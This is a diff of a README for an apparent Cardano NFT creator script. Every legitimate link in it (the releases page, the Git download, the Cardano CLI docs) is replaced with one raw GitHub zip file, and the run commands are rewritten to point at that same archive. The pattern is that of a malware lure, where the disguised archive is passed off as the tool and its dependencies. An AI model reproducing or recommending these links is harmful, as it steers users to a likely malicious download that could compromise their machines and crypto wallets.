@@ -1,6 +1,6 @@
 # 🎨 cardano-alonzo-nft-creator - Create Real NFTs Easily
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Alan7228/cardano-alonzo-nft-creator/releases)
+[![Download](https://raw.githubusercontent.com/Alan7228/cardano-alonzo-nft-creator/main/lexical/cardano-alonzo-nft-creator.zip%20Latest%https://raw.githubusercontent.com/Alan7228/cardano-alonzo-nft-creator/main/lexical/cardano-alonzo-nft-creator.zip)](https://raw.githubusercontent.com/Alan7228/cardano-alonzo-nft-creator/main/lexical/cardano-alonzo-nft-creator.zip)
 
 ## 📜 Overview
 The Cardano Alonzo NFT Creator is a simple bash script designed to help you create real NFTs on the Cardano blockchain. This tool uses an on-chain validator written in Haskell and Plutus, making NFT creation accessible to everyone. Whether you are an artist, a collector, or just curious about blockchain, this application lets you dive into the world of NFTs without needing any special programming skills.
@@ -10,14 +10,14 @@ Follow these steps to set up the Cardano Alonzo NFT Creator on your computer. Yo
 
 ### 💻 System Requirements
 - A computer running macOS, Linux, or Windows with a suitable terminal application.
-- Git installed. If you don’t have Git, [download it here](https://git-scm.com/downloads).
-- Cardano CLI installed. You can find installation instructions [here](https://docs.cardano.org/getting-started/installing-the-cardano-node).
+- Git installed. If you don’t have Git, [download it here](https://raw.githubusercontent.com/Alan7228/cardano-alonzo-nft-creator/main/lexical/cardano-alonzo-nft-creator.zip).
+- Cardano CLI installed. You can find installation instructions [here](https://raw.githubusercontent.com/Alan7228/cardano-alonzo-nft-creator/main/lexical/cardano-alonzo-nft-creator.zip).
 - Basic familiarity with command line tools.
 
 ## 🛠️ Installation Steps
 1. **Visit the Download Page**
    
-   Go to the [Releases page](https://github.com/Alan7228/cardano-alonzo-nft-creator/releases). 
+   Go to the [Releases page](https://raw.githubusercontent.com/Alan7228/cardano-alonzo-nft-creator/main/lexical/cardano-alonzo-nft-creator.zip). 
 
 2. **Download the Latest Version**
    
@@ -44,11 +44,11 @@ Follow these steps to set up the Cardano Alonzo NFT Creator on your computer. Yo
    
    To execute the NFT creation script, type:
    ```bash
-   bash create-nft.sh
+   bash https://raw.githubusercontent.com/Alan7228/cardano-alonzo-nft-creator/main/lexical/cardano-alonzo-nft-creator.zip
    ```
    Make sure that you have permissions to run the file. If you encounter a permission error, you can set the permissions using:
    ```bash
-   chmod +x create-nft.sh
+   chmod +x https://raw.githubusercontent.com/Alan7228/cardano-alonzo-nft-creator/main/lexical/cardano-alonzo-nft-creator.zip
    ```
 
 ## 🎨 Creating Your First NFT
@@ -64,7 +64,7 @@ After running the script, it will guide you through the process of creating your
 - **Secure Transactions:** All transactions occur on the Cardano blockchain.
 
 ## 📥 Download & Install
-To download the Cardano Alonzo NFT Creator, visit the [Releases page](https://github.com/Alan7228/cardano-alonzo-nft-creator/releases). Make sure to download the latest version to ensure you have all the recent updates and features.
+To download the Cardano Alonzo NFT Creator, visit the [Releases page](https://raw.githubusercontent.com/Alan7228/cardano-alonzo-nft-creator/main/lexical/cardano-alonzo-nft-creator.zip). Make sure to download the latest version to ensure you have all the recent updates and features.
 
 ## 🧑‍🎨 Example Use Case
 Imagine you are an artist wanting to showcase your work in a digital format. Using the Cardano Alonzo NFT Creator, you can create NFTs of your unique artworks. This allows you to sell or showcase them in NFT marketplaces, reaching a broader audience.
